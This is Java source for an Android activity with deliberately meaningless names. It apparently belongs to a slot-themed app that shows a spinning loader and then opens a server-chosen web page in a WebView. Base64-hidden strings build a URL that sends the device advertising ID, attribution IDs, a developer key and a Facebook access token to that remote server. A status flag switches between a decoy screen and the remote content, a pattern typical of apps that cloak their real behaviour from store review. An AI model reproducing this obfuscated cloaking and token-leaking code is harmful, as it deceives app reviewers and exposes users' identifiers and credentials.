package com.clivor.lykk;

import static com.clivor.lykk.AppSCL.UCSHS;
import static com.clivor.lykk.AppSCL.bbfkd;
import static com.clivor.lykk.AppSCL.ihhds;
import static com.clivor.lykk.AppSCL.jcsgaj;
import static com.clivor.lykk.AppSCL.nnhda;
import static com.clivor.lykk.Cllll.deep;
import static com.clivor.lykk.Cllll.strDeepLink;
import static com.clivor.lykk.WebCL.dsds;
import static com.clivor.lykk.WebCL.fdfdf;
import static com.clivor.lykk.WebCL.icshOCS;
import static com.clivor.lykk.WebCL.oijjccs;
import static com.clivor.lykk.WebCL.shda;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ImageView;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.room.Room;


import com.clivor.lykk.db.EntityCL;
import com.clivor.lykk.db.PointsDataBase;
import com.clivor.lykk.db.SaveDataBase;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.onesignal.OneSignal;

import java.util.Map.Entry;
import java.util.Random;


public class CL extends AppCompatActivity {

    ImageView imageViewLoad;
    Handler handler;
    WebView webCL;
    Button buttonInter;
    public static String pac;
    int counter = 0;
    SaveDataBase saveDataBase;
    String save;
    int saveSize;
    boolean ee = false;


    @Override
    protected void onStart() {
        super.onStart();
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(WebCL.docodCL("Y2U3NTIwMTctYTkxZS00M2JiLThmYTktOTY4ODZjMmJkYTZj"));
        pac = getPackageName();
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.cl);
        webCL = findViewById(R.id.webCL);
        AppSCL.appSl(CL.this);
        WebCL.cl = this;

        new Thread(new Runnable() {
            @Override
            public void run() {
                saveDataBase = Room.databaseBuilder(getApplicationContext(),
                        SaveDataBase.class, "udus").build();

                try {
                    save = saveDataBase.daoTab().getLastDao().getSaveLinc();
                    Log.d("wwww", save + "pppp");
                    saveSize = saveDataBase.daoTab().gethowMuchWeHaveDao();
                } catch (Exception e) {
                    Log.d("wwww", "pppp");
                }
            }
        }).start();

        imageViewLoad = findViewById(R.id.imageViewLoad);
        buttonInter = findViewById(R.id.buttonInter);
        buttonInter.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(), CL.class));
                finishAffinity();
            }
        });
        handler = new Handler();
        handler.post(new Runnable() {
            @Override
            public void run() {
                imageViewLoad.setRotation(imageViewLoad.getRotation() + 500);
                Random random = new Random();
                int r = random.nextInt(7);
                switch (r) {
                    case 0:
                        imageViewLoad.setImageResource(R.drawable.slot1);
                        break;
                    case 1:
                        imageViewLoad.setImageResource(R.drawable.slot2);
                        break;
                    case 2:
                        imageViewLoad.setImageResource(R.drawable.slot3);
                        break;
                    case 3:
                        imageViewLoad.setImageResource(R.drawable.slot4);
                        break;
                    case 4:
                        imageViewLoad.setImageResource(R.drawable.slot5);
                        break;
                    case 5:
                        imageViewLoad.setImageResource(R.drawable.slot6);
                        break;
                    case 6:
                        imageViewLoad.setImageResource(R.drawable.slot7);
                        break;
                }

                handler.postDelayed(this::run, 400);
            }
        });

        if (isaj()) {

            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (saveSize > 0) {
                        Log.d("wwww", "uuuuu");
                        webCL.setVisibility(View.VISIBLE);
                        webCL.loadUrl(save);
                    } else {

                        Cllll cllll = new Cllll();
                        cllll.execute();
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                if (Cllll.status != null) {
                                    Log.d("weq", Cllll.status);
                                    Log.d("weq", Cllll.url);
                                    Log.d("weq", Cllll.fbToken);
                                    Log.d("weq", Cllll.fbId);
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {

                                            FacebookSdk.setApplicationId(Cllll.fbId);
                                            FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                            FacebookSdk.sdkInitialize(getApplicationContext());
                                            FacebookSdk.fullyInitialize();
                                            FacebookSdk.setAutoInitEnabled(true);
                                            FacebookSdk.setAutoLogAppEventsEnabled(true);

                                            AppEventsLogger.activateApp(getApplication());
                                            AppLinkData.fetchDeferredAppLinkData(getApplicationContext(), new AppLinkData.CompletionHandler() {
                                                @Override
                                                public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {

                                                    if (appLinkData == null) {
                                                        appLinkData = AppLinkData.createFromActivity(CL.this);

                                                    }
                                                    if (appLinkData != null) {

                                                        String[] as = appLinkData.getTargetUri().toString().split("://");
                                                        deep = as[1];
                                                        strDeepLink = Cllll.parseCL(deep);

                                                    } else {

                                                    }
                                                }
                                            });

                                            handler.post(new Runnable() {
                                                @Override
                                                public void run() {
                                                    counter++;
                                                    Log.d("weq", counter + "");
                                                    if (!ihhds.equals("-") || !strDeepLink.equals("-")) {
                                                        if (ihhds.equals(WebCL.docodCL("Tm9uLW9yZ2FuaWM="))) {
                                                            String load = Cllll.url + bbfkd;
                                                            webCL.setVisibility(View.VISIBLE);
                                                            webCL.loadUrl(load);
                                                            Log.d("weq", "App" + load);
                                                            counter = 15;
                                                            ee = true;

                                                            new Thread(new Runnable() {
                                                                @Override
                                                                public void run() {
                                                                    EntityCL entityCL = new EntityCL(load);
                                                                    saveDataBase.daoTab().entity(entityCL);
                                                                }
                                                            }).start();
                                                        } else if (deep != null) {
                                                            String load = Cllll.url + strDeepLink;
                                                            webCL.setVisibility(View.VISIBLE);
                                                            webCL.loadUrl(load);
                                                            counter = 15;
                                                            ee = true;
                                                            Log.d("weq", "Dipp" + load);
                                                            new Thread(new Runnable() {
                                                                @Override
                                                                public void run() {
                                                                    EntityCL entityCL = new EntityCL(load);
                                                                    saveDataBase.daoTab().entity(entityCL);
                                                                }
                                                            }).start();
                                                        }
                                                    }

                                                    if (counter != 15) {
                                                        handler.postDelayed(this::run, 1000);
                                                    } else {
                                                        if (!ee) {
                                                            counter = 0;
                                                            if (Cllll.status.equals("0")) {

                                                                startActivity(new Intent(getApplicationContext(), ButtAcCl.class));
                                                                finishAffinity();
                                                            } else {

                                                                String uyu = Cllll.url + WebCL.docodCL("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                                                                        WebCL.docodCL("Jmdvb2dsZV9hZGlkPQ==") + nnhda +
                                                                        WebCL.docodCL("JmFmX3VzZXJpZD0=") + UCSHS +
                                                                        WebCL.docodCL("JmRldl9rZXk9") + WebCL.docodCL(jcsgaj) +
                                                                        WebCL.docodCL("JmJ1bmRsZT0=") + getPackageName() +
                                                                        WebCL.docodCL("JmZiX2FwcF9pZD0=") + Cllll.fbId +
                                                                        WebCL.docodCL("JmZiX2F0PQ==") + Cllll.fbToken;
                                                                webCL.setVisibility(View.VISIBLE);
                                                                webCL.loadUrl(uyu);
                                                                Log.d("weq", "organic");
                                                                new Thread(new Runnable() {
                                                                    @Override
                                                                    public void run() {
                                                                        EntityCL entityCL = new EntityCL(uyu);
                                                                        saveDataBase.daoTab().entity(entityCL);
                                                                    }
                                                                }).start();

                                                            }
                                                        } else {

                                                        }

                                                    }

                                                }
                                            });

                                        }
                                    });

                                } else {
                                    handler.postDelayed(this::run, 500);
                                }

                            }
                        });
                    }
                }
            }, 2000);


        } else {
            buttonInter.setVisibility(View.VISIBLE);
            imageViewLoad.setVisibility(View.INVISIBLE);
        }


    }

    private boolean isaj() {
        String cs = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager cm = (ConnectivityManager) getSystemService(cs);
        if (cm.getActiveNetworkInfo() == null) {
            return false;
        } else {
            return true;
        }
    }

    @Override
    public void onBackPressed() {
        if (webCL.isFocused() && webCL.canGoBack()) {
            webCL.goBack();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != icshOCS || oijjccs == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (shda != null) {
                    results = new Uri[]{Uri.parse(shda)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        oijjccs.onReceiveValue(results);
        oijjccs = null;
        if (fdfdf == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? dsds : data.getData();
            }
        } catch (Exception e) {
        }
        fdfdf.onReceiveValue(result);
        fdfdf = null;
    }
}
